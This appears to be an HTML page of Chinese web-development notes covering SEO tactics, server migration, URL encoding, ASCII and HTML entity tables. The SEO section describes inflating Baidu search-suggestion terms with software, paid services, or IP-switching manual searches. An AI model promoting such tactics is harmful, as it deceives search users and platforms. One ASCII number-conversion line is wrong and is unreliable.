关键词布置
关键词排名依次

2、将网站规范化
界面修改、url修改

3、站点内容强化
tdk、内容为王、原创性

4、建立外部链接
5、结合网站数据分析,转化
6、做大做强,由点到面

【 百度下拉框营销 】
减肥(v信xxxx)关键词每天的搜索量   长尾词
1.软件刷关键词
2.淘宝
3.手动刷:换IP搜索,但是要清除cookie。可以猪八戒网发布任务

【 霸屏平台选择 】
高质量的帖子;用好头像,签名,宣传自己的品牌,签名可以加入自己网站的介绍和连接
1.问答平台:百度知道
2.百科平台:百度百科,搜狗百科,360百科
3、百度电话:直接花钱买一个,搜索你的品牌名就出现了你的官网电话
4、百度地图
5、注册自媒体平台:搜狐、网易等等,注册发布信息,收录效果也不错
6、免费高权重博客:天涯博客、新浪博客、知乎、豆瓣、微博等
7、权重论坛:天涯论坛、行业相关论坛
8、视频网站:爱奇艺、优酷、搜狐视频等直接发布品牌介绍资料,也能快速取得排名
9、建立自己的官网:有官网是最好的品牌信任地
10、图片布局:通过高权重平台发布文章的时候带图片,让搜索引擎收录,alt标签写明图片的关键词。主要收录就会出现在百度图片里面
11、新闻媒体:花2000元钱找人在各大新闻媒体投放文章,由于这些平台本身权重高,马上就能出现在搜索首页
12、分类信息网站:注册发布品牌信息,排名都不错
13、注册把b2b平台:尤其是1688,慧聪这些,快速有效

【 站内站外优化 】
index.html单页面,发布文章,增加外链,友情链接,优化关键词

1.内容方面:
网站标题、关键字、描述
网站内容优化
robot.txt文件:权重导向设置,对于登录页,或只有通过登录才能浏览的页面统统nofollow掉
网站地图
404页面
增加外部引用

2.网站结构布局优化
a.控制首页链接数量,首页权重最大,链接太多则会分散权重
b.扁平化结构,目录层次,3层目录结构最好
c.导航SEO优化,主导航,副导航,分类导航,顶部导航和底部导航
d.面包屑导航
e.内容页布局,页面右部放置栏目信息、热门文章、相关文章
f.网站加载速度,文件大小

3.网页页面代码优化
TDk:title 分隔、eywords 5个最为合适、description
title属性,alt属性
锚文本链接加粗
纯文本链接
语义化代码:合适的位置合适的标签
重要的内容HTML代码放在最前面,爬虫先抓取,广告等在后面
重要内容不要用js输出,搜索引擎不友好
少使用iframe框架
谨慎使用display:none会被过滤
不断精简代码

3.关键词的布局
4.内容优化
5.专题页优化
6.外链建设策略

【 站点地图 】
1.一个网站所有链接的容器,是根据网站的结构、框架、内容生成的导航网页文件,方便搜索引擎蜘蛛抓取
2.一般存放在根目录下,并命名为sitemap.html
3.网站布局要简洁,所有链接是标准HTML文本,链接中包含尽可能多的目标关键字
4.每个页面里放置网站地图的链接,页面底部或者搜索栏附近
5.把sitemap写进robots.txt,搜索引擎访问网站要查看的第一个文件,
  搜索蜘蛛能访问网站上所有没有被口令保护的页面,网站包含不希望被搜索引擎收录的内容是才使用robots.txt文件
6.确保不要存在死链、断链
7.经常更新网站地图
8.NO FOLLOW a rel="nofollow" href="url"锚文本
9.有在线生成工具

【 内链布局 】
合理的网站内链布局有助于我们增加长尾关键词,是优化长尾关键词的有效方法
不仅对我们网站权重值的提升有很大的帮助,还可以提高搜索引擎的收录,最终能够提高整个网站的权重、排名以及PR值

【 交换站外友情链接 】
1.PR值是网站的权重
2.关联性
3.网站更新速度
4.搜索引擎收录数量

【 获取有效长尾关键词 】
1.了解用户搜索行为才能够更好的把握充实性的内容,写出人们有所需求的文章,通过百度知道便能够进一步掌握搜索用户需要寻找的问题和答案,通过百度知道了解到了用户的搜索行为,这时便有助于SEOer站内优化时对内容的把握,对长尾关键词的准确定位
2.百度下拉框,都是与之相关的长尾关键词,百度都是根据用户行为而设定
3.百度相关搜索
4.关键词挖掘工具
5.网站流量统计工具,不仅仅是统计数据,更是能够了解用户平时的搜索行为,能从中了解用户的来源,通过什么搜索引擎什么关键词到达网站

</pre>

<h4>服务器相关</h4><pre>
服务器或空间的转移,比如有时候空间到期了想换一个更大的空间或现有的流量和空间不满足了要换服务器了,有时网通服务器访问比较缓慢要换双线服务器,各种各样的问题都是要更换服务器的,经常更换空间或服务器会发现一些情况:
1、网站的快照不动,甚至网站快照出现倒退的现象,特别是一些权重不高的新站(不超过6个月的网站)
2、发现网站的收录没有以前的速度快了
3、关键词的排名有了下降会浮动很大

原因
1、DNS解析引起的问题。转移服务器时需要重新解析到新的服务器ip上面,即转移空间或服务器时域名要重新解析,那么就会出现这样的情况,DNS的全球生效时间一般是24个小时,在这个时间内每个地方ping域名的ip地址都会不一样,有时候域名解析了后,自己访问5分钟就生效了,但其他省份的人ping的时候还是以前的ip。如果在这个时间内老站不能访问或者网站数据被删除了的话,网站就会收到影响,因为搜索引擎再次抓取的时候就会出现死链接

2、蜘蛛对域名指向的ip地址会进行缓存,就是说蜘蛛为了快速的访问,节省服务器的响应时间,它会对每一个域名进行一个缓存数据,缓存数据保留的时间不定,因为一旦进行了ip更换,搜索引擎的蜘蛛还在用缓存ip地址进行访问的时候发现网站不能访问,这时候就会出现死链接,会导致网站关键词排名和网站权重以及网站的信用度下降

怎样来解决上面出现的问题
1.转移服务器的时候尽量采取蜘蛛访问量少的时间段,只要IIS日志设置为一个小时生成一次,一天24份日志,然后用IIS批量检查工具检测就可以看出哪个时间段蜘蛛的爬取量是最小的,就解决那一个小时

2.在更换服务器的时候保证原来服务器和空间能继续访问,就是说数据要进行同步更新,同步更新的时间不需要多久,让原来的程序还是能够访问,就是说把ip地址解析到一个新的ip地址上面,它生效有一个时间段,它跟地区是有关系的,所以要保证原来的ip地址至少要24个小时,直到新的ip地址能够在全球能够完全生效。如果不是做外贸网站的只要看中国就行！其实只要认真去观察IIS日志,可以发现百度有联通蜘蛛和百度蜘蛛,因为百度也有很多的服务器,分布到全国各地,而且每个服务器都有抓取网站的功能

</pre>

<h4>SEO全过程</h4><pre>
竞争对手分析:
在做seo方案之前,先对竞争对手进行分析,研究,找出对手的优势、劣势,取其精华去其糟粕

优化的目标:主要从网站流量和SEO指标方面设定。SEO指标包括百度快照日期、关键词流量、关键词排名外链数量及质量、百度收录量等等

优化策略:主要从站内优化和站外优化方面进行考虑
站内优化策略一:网站结构优化
站内优化策略二:网站代码优化
站内优化策略三:关键词的布局
站内优化策略四:网站内容的优化,内容为王
站内优化策略五:专题页优化
外链建设策略:外链建设主要包括友情链接、知识问答、网络收藏、软文推广、分类网站、在线黄页、论坛等方式构建

SEO的数据监控与分析:
SEO效果预测
工作计划与费用预算(简单举例,实际工作中需要结合具体情况而定)

</pre>

<p><img src="./image/1.jpg" /></p>
<p><img src="./image/2.jpg" /></p>
<p><img src="./image/3.jpg" /></p>
<p><img src="./image/4.jpg" /></p>
<p><img src="./image/5.jpg" /></p>
<p><img src="./image/6.jpg" /></p>
<p><img src="./image/7.jpg" /></p>
<p><img src="./image/8.jpg" /></p>
<p><img src="./image/9.jpg" /></p>
<p><img src="./image/10.jpg" /></p>
<p><img src="./image/11.jpg" /></p>
<p><img src="./image/12.jpg" /></p>
<p><img src="./image/13.jpg" /></p>

</div>

<div id="url">
<h3>url编码</h3><pre>
URL编码会将字符转换为可通过因特网传输的格式

Web浏览器通过URL从web服务器请求页面
URL是网页的地址,比如:http://www.runoob.com

URL只能使用ASCII字符集来通过因特网进行发送,由于URL常常会包含ASCII集合之外的字符,URL必须转换为有效的ASCII格式
URL编码使用"%"其后跟随两位的十六进制数来替换非ASCII字符,URL不能包含空格,通常使用+来替换空格

JavaScript、PHP、ASP都提供了对字符串进行URL编码的函数
JavaScript中使用encodeURI()函数,将空格编码成 %20
PHP中使用rawurlencode()函数
ASP中使用Server.URLEncode()函数

ASCII字符 URL-编码
space     %20
!         %21
"         %22
#         %23
$         %24
%         %25
&         %26
'         %27
(         %28
)         %29
*         %2A
+         %2B
,         %2C
-         %2D
.         %2E
/         %2F
0         %30
1         %31
2         %32
3         %33
4         %34
5         %35
6         %36
7         %37
8         %38
9         %39
:         %3A
;         %3B
<         %3C
=         %3D
>         %3E
?         %3F
@         %40
A         %41
B         %42
C         %43
D         %44
E         %45
F         %46
G         %47
H         %48
I         %49
J         %4A
K         %4B
L         %4C
M         %4D
N         %4E
O         %4F
P         %50
Q         %51
R         %52
S         %53
T         %54
U         %55
V         %56
W         %57
X         %58
Y         %59
Z         %5A
[         %5B
\         %5C
]         %5D
^         %5E
_         %5F
`         %60
a         %61
b         %62
c         %63
d         %64
e         %65
f         %66
g         %67
h         %68
i         %69
j         %6A
k         %6B
l         %6C
m         %6D
n         %6E
o         %6F
p         %70
q         %71
r         %72
s         %73
t         %74
u         %75
v         %76
w         %77
x         %78
y         %79
z         %7A
{         %7B
|         %7C
}         %7D
~         %7E

</pre>
</div>

<div id="ascii">
<h3>ASCII码标准表</h3><pre>
ASCII(American Standard Code for Information Interchange,美国信息交换标准代码)是基于拉丁字母的一套电脑编码系统,
主要用于显示现代英语和其他西欧语言,是现今最通用的单字节编码系统,并等同于国际标准ISO/IEC 646

ASCII是7比特字符集,包含128个不同的字符值
ASCII支持0-9的数字,A-Z大写和小写英文字母,以及一些特殊字符
被广泛使用于现代计算机、HTML和因特网上的字符集都是基于ASCII

如需正确地显示HTML页面,浏览器必须知道使用何种字符集
万维网早期使用的字符集是ASCII。ASCII支持 0-9的数字,大写和小写英文字母表,以及一些特殊字符
由于很多国家使用的字符并不属于ASCII,现代浏览器的默认字符集是ISO-8859-1
如果网页使用不同于ISO-8859-1的字符集,就应该在meta标签进行指定

由于iso字符集都有容量限制,而且不兼容多语言环境,Unicode联盟开发了Unicode标准
Unicode 标准涵盖了世界上的所有字符、标点和符号
不论是何种平台、程序或语言,Unicode 都能够进行文本数据的处理、存储和交换

计算机只知道0和1,如果要计算机识别除了01之外的字符,例如要先告诉计算机'1100001'就是字符'a'
所谓的字符编码就是跟计算机约定一连串的0101到底代表了什么字符
ascii编码是鼻祖,但是ascii只有8bits,一个ASCII码值占一个字节(8个二进制位),实际用到的是7位,所以只能表示128个字符(00000000~01111111),包括可打印的普通字符和不可打印的命令字符

原始的ASCII编码是7位的,有2^7=128个字符(包括一些不可显示字符)。但电脑里1Byte=8bit,早期的电脑不太可靠,数据经常出错,所以这1Byte的8位中最高位就用来做数据校验,一般是奇偶校验。

后来的电脑变得可靠了,校验的意义不大了,因此有了一个扩展ASCII字符集。扩展ASCII字符集包含2^8=256个字符,编码是8位的。
扩展ASCII字符集中的前128个字符与原来的ASCII字符集相同(就是原来的ASCII字符集的7位编码前面加一个0),而后面128个字符高位都是1。
但是扩展ASCII字符集并不被其它非英语国家的编码系统接受。比如中国的GB字符集(不包括GB18030,GB18030包括3Byte的编码),其中编码的字符有如下两种(按照二进制):
1Byte:0xxxxxxx
2Byte:1xxxxxxx xxxxxxxx
其中1Byte那些字符也和原始ASCII字符集相同(前面加个0),2Byte编码的大多是汉字,由于两种编码分别以0和1开头,因此GB编码虽然是不等长编码,但是不会产生歧义

这128个字符对于美国人来说应该是足够了。但对于一些使用非英文字符的国家地区,例如拉丁文,发文,俄文,中文就绝对不够。
所以后来就有人搞了扩展的ascii,也有人搞了新的字符编码,在原来的8位基础上扩展到16位、32位。常见的ISOxxxx,GB2312,GBK,BIG 5,unicode....都是后来发展起来的。

虽然这些字符编码有些之间是不兼容,就中文而言,gb2312是不兼容unicode的,即同一个汉字底层约定的二进制是不一样的,网页上的乱码就是出于此。但是这些后来发展的字符编码都向下兼容了ascii。这就是为什么utf-8(unicode)和gbk/gb2312显示英文是不会有乱码,而显示中文会容易乱码,因为都兼容ascii,所以52个字母的显示都是按ascii标准。但ascii是没中文的,所以unicode,gbk都按各自标准解释了。

ASCII码使用指定的7位或8位二进制数组合来表示128或256种可能的字符。标准ASCII码也叫基础ASCII码,使用7位二进制数(剩下的1位二进制为0)来表示所有的大写和小写字母,数字0到9、标点符号以及在美式英语中使用的特殊控制字符。其中:
0~31及127(共33个)是控制字符或通信专用字符(其余为可显示字符),
如控制符:LF(换行)、CR(回车)、FF(换页)、DEL(删除)、BS(退格)、BEL(响铃)等;
通信专用字符:SOH(文头)、EOT(文尾)、ACK(确认)等;
ASCII值为8、9、10和13分别转换为退格、制表、换行和回车字符,它们没有特定的图形显示,依不同的应用程序对文本显示有不同的影响
32~126(共95个)是字符(32是空格),其中48~57为0到9十个阿拉伯数字。65~90为26个大写英文字母,97~122号为26个小写英文字母,其余为一些标点符号、运算符号等。
在标准ASCII中其最高位(b7)用作奇偶校验位,奇偶校验指在代码传送过程中用来检验是否出现错误的一种方法,一般分奇校验和偶校验两种。奇校验规定:正确的代码一个字节中1的个数必须是奇数,若非奇数则在最高位b7添1;偶校验规定:正确的代码一个字节中1的个数必须是偶数,若非偶数则在最高位b7添1。
后128个称为扩展ASCII码。许多基于x86的系统都支持使用扩展(或"高")ASCII。扩展ASCII码允许将每个字符的第8位用于确定附加的128 个特殊符号字符、外来语字母和图形符号

查询ASCII码对应的字符技巧
1、文本文档中按住ALT+要查询的十进制码值,松开即可显示出对应字符。例如:按住ALT+97则会显示出'a'
2、linux/unix下可以使用man ascii查看
3、32-127十进制码前面加上&#会显示当前ASCII码代表的html字符

Dec:十进制
Hex:十六进制
Oct:八进制
Bin:二进制
所以数字16表示为:16D = 01H = 018O = 1000 0000B

php中
十进制是整数
十六进制首位0x
八进制首位是0
二进制只有0和1,看做字符串,加引号,上面三个都不用加

</pre>

<table>
  <tr><th colspan="7">标准ASCII表</th></tr>
  <tr><td>Bin(二进制)</td><td>Oct(八进制)</td><td>Dec(十进制)</td><td>Hex(十六进制)</td><td>缩写/字符</td><td>解释</td><td>转义字符</td></tr>
  <tr><td>0000 0000</td><td>0</td><td>0</td><td>00</td><td>NUL(null)</td><td>空字符</td><td>\0</td></tr>
  <tr><td>0000 0001</td><td>1</td><td>1</td><td>01</td><td>SOH(start of headline)</td><td>标题开始</td></tr>
  <tr><td>0000 0010</td><td>2</td><td>2</td><td>02</td><td>STX(start of text)</td><td>正文开始</td></tr>
  <tr><td>0000 0011</td><td>3</td><td>3</td><td>03</td><td>ETX(end of text)</td><td>正文结束</td></tr>
  <tr><td>0000 0100</td><td>4</td><td>4</td><td>04</td><td>EOT(end of transmission)</td><td>传输结束</td></tr>
  <tr><td>0000 0101</td><td>5</td><td>5</td><td>05</td><td>ENQ(enquiry)</td><td>请求</td></tr>
  <tr><td>0000 0110</td><td>6</td><td>6</td><td>06</td><td>ACK(acknowledge)</td><td>收到通知</td></tr>
  <tr><td>0000 0111</td><td>7</td><td>7</td><td>07</td><td>BEL(bell)</td><td>响铃</td><td>\a</td></tr>
  <tr><td>0000 1000</td><td>10</td><td>8</td><td>08</td><td>BS(backspace)</td><td>退格</td><td>\b</td></tr>
  <tr><td>0000 1001</td><td>11</td><td>9</td><td>09</td><td>HT(horizontal tab)</td><td>水平制表符</td><td>\t</td></tr>
  <tr><td>0000 1010</td><td>12</td><td>10</td><td>0A</td><td>LF(NL line feed, new line)</td><td>换行键</td><td>\n</td></tr>
  <tr><td>0000 1011</td><td>13</td><td>11</td><td>0B</td><td>VT(vertical tab)</td><td>垂直制表符</td><td>\v</td></tr>
  <tr><td>0000 1100</td><td>14</td><td>12</td><td>0C</td><td>FF(NP form feed, new page)</td><td>换页键</td><td>\f</td></tr>
  <tr><td>0000 1101</td><td>15</td><td>13</td><td>0D</td><td>CR(carriage return)</td><td>回车键</td><td>\r</td></tr>
  <tr><td>0000 1110</td><td>16</td><td>14</td><td>0E</td><td>SO(shift out)</td><td>不用切换</td></tr>
  <tr><td>0000 1111</td><td>17</td><td>15</td><td>0F</td><td>SI(shift in)</td><td>启用切换</td></tr>
  <tr><td>0001 0000</td><td>20</td><td>16</td><td>10</td><td>DLE(data link escape)</td><td>数据链路转义</td></tr>
  <tr><td>0001 0001</td><td>21</td><td>17</td><td>11</td><td>DC1(device control 1)</td><td>设备控制1</td></tr>
  <tr><td>0001 0010</td><td>22</td><td>18</td><td>12</td><td>DC2(device control 2)</td><td>设备控制2</td></tr>
  <tr><td>0001 0011</td><td>23</td><td>19</td><td>13</td><td>DC3(device control 3)</td><td>设备控制3</td></tr>
  <tr><td>0001 0100</td><td>24</td><td>20</td><td>14</td><td>DC4(device control 4)</td><td>设备控制4</td></tr>
  <tr><td>0001 0101</td><td>25</td><td>21</td><td>15</td><td>NAK(negative acknowledge)</td><td>拒绝接收</td></tr>
  <tr><td>0001 0110</td><td>26</td><td>22</td><td>16</td><td>SYN(synchronous idle)</td><td>同步空闲</td></tr>
  <tr><td>0001 0111</td><td>27</td><td>23</td><td>17</td><td>ETB(end of trans. block)</td><td>结束传输块</td></tr>
  <tr><td>0001 1000</td><td>30</td><td>24</td><td>18</td><td>CAN(cancel)</td><td>取消</td></tr>
  <tr><td>0001 1001</td><td>31</td><td>25</td><td>19</td><td>EM(end of medium)</td><td>媒介结束</td></tr>
  <tr><td>0001 1010</td><td>32</td><td>26</td><td>1A</td><td>SUB(substitute)</td><td>代替</td></tr>
  <tr><td>0001 1011</td><td>33</td><td>27</td><td>1B</td><td>ESC(escape)</td><td>换码(溢出)</td><td>\e</td></tr>
  <tr><td>0001 1100</td><td>34</td><td>28</td><td>1C</td><td>FS(file separator)</td><td>文件分隔符</td></tr>
  <tr><td>0001 1101</td><td>35</td><td>29</td><td>1D</td><td>GS(group separator)</td><td>分组符</td></tr>
  <tr><td>0001 1110</td><td>36</td><td>30</td><td>1E</td><td>RS(record separator)</td><td>记录分隔符</td></tr>
  <tr><td>0001 1111</td><td>37</td><td>31</td><td>1F</td><td>US(unit separator)</td><td>单元分隔符</td></tr>
  <tr><td>0010 0000</td><td>40</td><td>32</td><td>20</td><td>(space)</td><td>空格</td></tr>
  <tr><td>0010 0001</td><td>41</td><td>33</td><td>21</td><td>!</td><td>叹号</td></tr>
  <tr><td>0010 0010</td><td>42</td><td>34</td><td>22</td><td>&quot;</td><td>双引号</td></tr>
  <tr><td>0010 0011</td><td>43</td><td>35</td><td>23</td><td>#</td><td>井号</td></tr>
  <tr><td>0010 0100</td><td>44</td><td>36</td><td>24</td><td>$</td><td>美元符</td></tr>
  <tr><td>0010 0101</td><td>45</td><td>37</td><td>25</td><td>%</td><td>百分号</td></tr>
  <tr><td>0010 0110</td><td>46</td><td>38</td><td>26</td><td>&amp;</td><td>和号</td></tr>
  <tr><td>0010 0111</td><td>47</td><td>39</td><td>27</td><td>&#39;</td><td>闭单引号</td></tr>
  <tr><td>0010 1000</td><td>50</td><td>40</td><td>28</td><td>(</td><td>开括号</td></tr>
  <tr><td>0010 1001</td><td>51</td><td>41</td><td>29</td><td>)</td><td>闭括号</td></tr>
  <tr><td>0010 1010</td><td>52</td><td>42</td><td>2A</td><td>*</td><td>星号</td></tr>
  <tr><td>0010 1011</td><td>53</td><td>43</td><td>2B</td><td>+</td><td>加号</td></tr>
  <tr><td>0010 1100</td><td>54</td><td>44</td><td>2C</td><td>,</td><td>逗号</td></tr>
  <tr><td>0010 1101</td><td>55</td><td>45</td><td>2D</td><td>-</td><td>减号/破折号</td></tr>
  <tr><td>0010 1110</td><td>56</td><td>46</td><td>2E</td><td>.</td><td>句号</td></tr>
  <tr><td>00101111</td><td>57</td><td>47</td><td>2F</td><td>/</td><td>斜杠</td></tr>
  <tr><td>00110000</td><td>60</td><td>48</td><td>30</td><td>0</td><td>数字0</td></tr>
  <tr><td>00110001</td><td>61</td><td>49</td><td>31</td><td>1</td><td>数字1</td></tr>
  <tr><td>00110010</td><td>62</td><td>50</td><td>32</td><td>2</td><td>数字2</td></tr>
  <tr><td>00110011</td><td>63</td><td>51</td><td>33</td><td>3</td><td>数字3</td></tr>
  <tr><td>00110100</td><td>64</td><td>52</td><td>34</td><td>4</td><td>数字4</td></tr>
  <tr><td>00110101</td><td>65</td><td>53</td><td>35</td><td>5</td><td>数字5</td></tr>
  <tr><td>00110110</td><td>66</td><td>54</td><td>36</td><td>6</td><td>数字6</td></tr>
  <tr><td>00110111</td><td>67</td><td>55</td><td>37</td><td>7</td><td>数字7</td></tr>
  <tr><td>00111000</td><td>70</td><td>56</td><td>38</td><td>8</td><td>数字8</td></tr>
  <tr><td>00111001</td><td>71</td><td>57</td><td>39</td><td>9</td><td>数字9</td></tr>
  <tr><td>00111010</td><td>72</td><td>58</td><td>3A</td><td>:</td><td>冒号</td></tr>
  <tr><td>00111011</td><td>73</td><td>59</td><td>3B</td><td>;</td><td>分号</td></tr>
  <tr><td>00111100</td><td>74</td><td>60</td><td>3C</td><td>&lt;</td><td>小于</td></tr>
  <tr><td>00111101</td><td>75</td><td>61</td><td>3D</td><td>=</td><td>等号</td></tr>
  <tr><td>00111110</td><td>76</td><td>62</td><td>3E</td><td>&gt;</td><td>大于</td></tr>
  <tr><td>00111111</td><td>77</td><td>63</td><td>3F</td><td>?</td><td>问号</td></tr>
  <tr><td>01000000</td><td>100</td><td>64</td><td>40</td><td>@</td><td>电子邮件符号</td></tr>
  <tr><td>01000001</td><td>101</td><td>65</td><td>41</td><td>A</td><td>大写字母A　</td></tr>
  <tr><td>01000010</td><td>102</td><td>66</td><td>42</td><td>B</td><td>大写字母B</td></tr>
  <tr><td>01000011</td><td>103</td><td>67</td><td>43</td><td>C</td><td>大写字母C</td></tr>
  <tr><td>01000100</td><td>104</td><td>68</td><td>44</td><td>D</td><td>大写字母D</td></tr>
  <tr><td>01000101</td><td>105</td><td>69</td><td>45</td><td>E</td><td>大写字母E</td></tr>
  <tr><td>01000110</td><td>106</td><td>70</td><td>46</td><td>F</td><td>大写字母F</td></tr>
  <tr><td>01000111</td><td>107</td><td>71</td><td>47</td><td>G</td><td>大写字母G</td></tr>
  <tr><td>01001000</td><td>110</td><td>72</td><td>48</td><td>H</td><td>大写字母H</td></tr>
  <tr><td>01001001</td><td>111</td><td>73</td><td>49</td><td>I</td><td>大写字母I</td></tr>
  <tr><td>01001010</td><td>112</td><td>74</td><td>4A</td><td>J</td><td>大写字母J</td></tr>
  <tr><td>01001011</td><td>113</td><td>75</td><td>4B</td><td>K</td><td>大写字母K</td></tr>
  <tr><td>01001100</td><td>114</td><td>76</td><td>4C</td><td>L</td><td>大写字母L</td></tr>
  <tr><td>01001101</td><td>115</td><td>77</td><td>4D</td><td>M</td><td>大写字母M</td></tr>
  <tr><td>01001110</td><td>116</td><td>78</td><td>4E</td><td>N</td><td>大写字母N</td></tr>
  <tr><td>01001111</td><td>117</td><td>79</td><td>4F</td><td>O</td><td>大写字母O</td></tr>
  <tr><td>01010000</td><td>120</td><td>80</td><td>50</td><td>P</td><td>大写字母P</td></tr>
  <tr><td>01010001</td><td>121</td><td>81</td><td>51</td><td>Q</td><td>大写字母Q</td></tr>
  <tr><td>01010010</td><td>122</td><td>82</td><td>52</td><td>R</td><td>大写字母R</td></tr>
  <tr><td>01010011</td><td>123</td><td>83</td><td>53</td><td>S</td><td>大写字母S</td></tr>
  <tr><td>01010100</td><td>124</td><td>84</td><td>54</td><td>T</td><td>大写字母T</td></tr>
  <tr><td>01010101</td><td>125</td><td>85</td><td>55</td><td>U</td><td>大写字母U</td></tr>
  <tr><td>01010110</td><td>126</td><td>86</td><td>56</td><td>V</td><td>大写字母V</td></tr>
  <tr><td>01010111</td><td>127</td><td>87</td><td>57</td><td>W</td><td>大写字母W</td></tr>
  <tr><td>01011000</td><td>130</td><td>88</td><td>58</td><td>X</td><td>大写字母X</td></tr>
  <tr><td>01011001</td><td>131</td><td>89</td><td>59</td><td>Y</td><td>大写字母Y</td></tr>
  <tr><td>01011010</td><td>132</td><td>90</td><td>5A</td><td>Z</td><td>大写字母Z</td></tr>
  <tr><td>01011011</td><td>133</td><td>91</td><td>5B</td><td>[</td><td>开方括号</td></tr>
  <tr><td>01011100</td><td>134</td><td>92</td><td>5C</td><td>\</td><td>反斜杠</td></tr>
  <tr><td>01011101</td><td>135</td><td>93</td><td>5D</td><td>]</td><td>闭方括号</td></tr>
  <tr><td>01011110</td><td>136</td><td>94</td><td>5E</td><td>^</td><td>脱字符</td></tr>
  <tr><td>01011111</td><td>137</td><td>95</td><td>5F</td><td>_</td><td>下划线</td></tr>
  <tr><td>01100000</td><td>140</td><td>96</td><td>60</td><td>`</td><td>开单引号</td></tr>
  <tr><td>01100001</td><td>141</td><td>97</td><td>61</td><td>a</td><td>小写字母a　</td></tr>
  <tr><td>01100010</td><td>142</td><td>98</td><td>62</td><td>b</td><td>小写字母b</td></tr>
  <tr><td>01100011</td><td>143</td><td>99</td><td>63</td><td>c</td><td>小写字母c</td></tr>
  <tr><td>01100100</td><td>144</td><td>100</td><td>64</td><td>d</td><td>小写字母d</td></tr>
  <tr><td>01100101</td><td>145</td><td>101</td><td>65</td><td>e</td><td>小写字母e</td></tr>
  <tr><td>01100110</td><td>146</td><td>102</td><td>66</td><td>f</td><td>小写字母f</td></tr>
  <tr><td>01100111</td><td>147</td><td>103</td><td>67</td><td>g</td><td>小写字母g</td></tr>
  <tr><td>01101000</td><td>150</td><td>104</td><td>68</td><td>h</td><td>小写字母h</td></tr>
  <tr><td>01101001</td><td>151</td><td>105</td><td>69</td><td>i</td><td>小写字母i</td></tr>
  <tr><td>01101010</td><td>152</td><td>106</td><td>6A</td><td>j</td><td>小写字母j</td></tr>
  <tr><td>01101011</td><td>153</td><td>107</td><td>6B</td><td>k</td><td>小写字母k</td></tr>
  <tr><td>01101100</td><td>154</td><td>108</td><td>6C</td><td>l</td><td>小写字母l</td></tr>
  <tr><td>01101101</td><td>155</td><td>109</td><td>6D</td><td>m</td><td>小写字母m</td></tr>
  <tr><td>01101110</td><td>156</td><td>110</td><td>6E</td><td>n</td><td>小写字母n</td></tr>
  <tr><td>01101111</td><td>157</td><td>111</td><td>6F</td><td>o</td><td>小写字母o</td></tr>
  <tr><td>01110000</td><td>160</td><td>112</td><td>70</td><td>p</td><td>小写字母p</td></tr>
  <tr><td>01110001</td><td>161</td><td>113</td><td>71</td><td>q</td><td>小写字母q</td></tr>
  <tr><td>01110010</td><td>162</td><td>114</td><td>72</td><td>r</td><td>小写字母r</td></tr>
  <tr><td>01110011</td><td>163</td><td>115</td><td>73</td><td>s</td><td>小写字母s</td></tr>
  <tr><td>01110100</td><td>164</td><td>116</td><td>74</td><td>t</td><td>小写字母t</td></tr>
  <tr><td>01110101</td><td>165</td><td>117</td><td>75</td><td>u</td><td>小写字母u</td></tr>
  <tr><td>01110110</td><td>166</td><td>118</td><td>76</td><td>v</td><td>小写字母v</td></tr>
  <tr><td>01110111</td><td>167</td><td>119</td><td>77</td><td>w</td><td>小写字母w</td></tr>
  <tr><td>01111000</td><td>170</td><td>120</td><td>78</td><td>x</td><td>小写字母x</td></tr>
  <tr><td>01111001</td><td>171</td><td>121</td><td>79</td><td>y</td><td>小写字母y</td></tr>
  <tr><td>01111010</td><td>172</td><td>122</td><td>7A</td><td>z</td><td>小写字母z</td></tr>
  <tr><td>01111011</td><td>173</td><td>123</td><td>7B</td><td>{</td><td>开花括号</td></tr>
  <tr><td>01111100</td><td>174</td><td>124</td><td>7C</td><td>|</td><td>垂线</td></tr>
  <tr><td>01111101</td><td>175</td><td>125</td><td>7D</td><td>}</td><td>闭花括号</td></tr>
  <tr><td>01111110</td><td>176</td><td>126</td><td>7E</td><td>~</td><td>波浪号</td></tr>
  <tr><td>01111111</td><td>177</td><td>127</td><td>7F</td><td>DEL(delete)</td><td>删除</td></tr>
</table>
</div>

<div id="htmlcode">
<h3>html常用网页特殊字符代码</h3>
  <table>
    <tr>
        <th  width="50">符号</th><th align="center" width="90">html代码</th>
        <th align="center" width="50">符号</th><th align="center" width="90">html代码</th>
        <th align="center" width="50">符号</th><th align="center" width="90">html代码</th>
        <th align="center" width="50">符号</th><th align="center" width="90">html代码</th>
        <th align="center" width="50">符号</th><th align="center" width="90">html代码</th>
    </tr>
    <tr>
        <td align="center">&acute;</td> <td class="fuhao_text">&amp;acute;</td>
        <td align="center">&copy;</td> <td class="fuhao_text">&amp;copy;</td>
        <td align="center">&gt;</td> <td class="fuhao_text">&amp;gt;</td>
        <td align="center">&micro;</td> <td class="fuhao_text">&amp;micro;</td>
        <td align="center">&reg;</td> <td class="fuhao_text">&amp;reg;</td>
    </tr>
    <tr>
        <td align="center">&amp;</td> <td class="fuhao_text">&amp;amp;</td>
        <td align="center">&deg;</td> <td class="fuhao_text">&amp;deg;</td>
        <td align="center">&iexcl;</td> <td class="fuhao_text">&amp;iexcl;</td>
        <td align="center">&nbsp;</td> <td class="fuhao_text">&amp;nbsp;</td>
        <td align="center">&raquo;</td> <td class="fuhao_text">&amp;raquo;</td>
    </tr>
    <tr>
        <td align="center">&brvbar;</td> <td class="fuhao_text">&amp;brvbar;</td>
        <td align="center">&divide;</td> <td class="fuhao_text">&amp;divide;</td>
        <td align="center">&iquest;</td> <td class="fuhao_text">&amp;iquest;</td>
        <td align="center">&not;</td> <td class="fuhao_text">&amp;not;</td>
        <td align="center">&sect;</td> <td class="fuhao_text">&amp;sect;</td>
    </tr>
    <tr>
        <td align="center">&bull;</td> <td class="fuhao_text">&amp;bull;</td>
        <td align="center">&frac12;</td> <td class="fuhao_text">&amp;frac12;</td>
        <td align="center">&laquo;</td> <td class="fuhao_text">&amp;laquo;</td>
        <td align="center">&para;</td> <td class="fuhao_text">&amp;para;</td>
        <td align="center">&uml;</td> <td class="fuhao_text">&amp;uml;</td>
    </tr>
    <tr>
        <td align="center">&cedil;</td> <td class="fuhao_text">&amp;cedil;</td>
        <td align="center">&frac14;</td> <td class="fuhao_text">&amp;frac14;</td>
        <td align="center">&lt;</td> <td class="fuhao_text">&amp;lt;</td>
        <td align="center">&plusmn;</td> <td class="fuhao_text">&amp;plusmn;</td>
        <td align="center">&times;</td> <td class="fuhao_text">&amp;times;</td>
    </tr>
    <tr>
        <td align="center">&cent;</td> <td class="fuhao_text">&amp;cent;</td>
        <td align="center">&frac34;</td> <td class="fuhao_text">&amp;frac34;</td>
        <td align="center">&macr;</td> <td class="fuhao_text">&amp;macr;</td>
